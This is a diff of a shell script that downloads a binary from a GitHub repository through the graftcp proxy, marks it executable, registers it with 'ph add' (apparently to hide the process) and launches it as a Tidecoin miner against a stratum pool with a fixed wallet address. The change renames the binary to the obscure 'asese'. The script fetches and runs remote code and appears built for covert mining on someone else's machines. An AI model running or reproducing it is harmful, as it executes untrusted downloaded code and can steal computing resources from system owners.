@@ -40,9 +40,9 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/cccpavx2
-chmod +x cccpavx2
+./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/asese
+chmod +x asese
 
-ph add cccpavx2
+ph add asese
 
-./graftcp/graftcp ./cccpavx2 -a yespowertide -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyCuan01 -t 39
+./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyRig8 --algo yespower --param-n 2048 --param-r 8 --param-key ""
